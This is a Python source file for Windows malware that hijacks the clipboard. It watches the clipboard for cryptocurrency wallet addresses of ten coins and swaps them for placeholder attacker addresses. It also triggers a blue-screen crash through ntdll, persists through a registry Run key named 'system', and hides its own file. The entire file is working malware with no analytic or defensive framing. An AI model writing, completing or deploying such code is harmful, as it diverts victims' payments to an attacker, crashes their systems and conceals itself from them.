import pyperclip
import time
import re

CRITICAL_PROCCESS = True
ADD_TO_STARTUP = True 
HIDE_BINARIES = True

def critproc():
    import ctypes
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")
    
# Add to startup
def startup():
    import os
    import inspect
    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename.replace(".py", ".exe")
    os.system("""reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "system" /t REG_SZ /d "{}" /f""".format(cmd237))
    print("[*] Successfully added to startup"+cmd237)

def hide():
    import os
    import inspect
    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
    os.system("""attrib +h "{}" """.format(cmd237))
    print("[*] Binaries successfully h1dden")

def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
        "eth": "^0x[a-fA-F0-9]{40}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0

def replace_crypto(data):
    my_addresses = {
                    "lite": "YOUR-LITE-ADDRESS",
                    "dot": "YOUR-DOT-ADDRESS",
                    "tron": "YOUR-TRON-ADDRESS",
                    "btc": "YOUR-BTC-ADDRESS",
                    "xrp": "YOUR-XRP-ADDRESS",
                    "doge": "YOUR-DOGE-ADDRESS",
                    "xmr": "YOUR-XMR-ADDRESS",
                    "eth": "YOUR-ETH-ADDRESS",
                    "ada": "YOUR-ADA-ADDRESS",
                    "dash": "YOUR-DASH-ADDRESS",
                    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0

def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)

if __name__ == "__main__":
    if CRITICAL_PROCCESS:
        critproc()
    if ADD_TO_STARTUP:
        startup()        
    if HIDE_BINARIES:
        hide()    
    main()
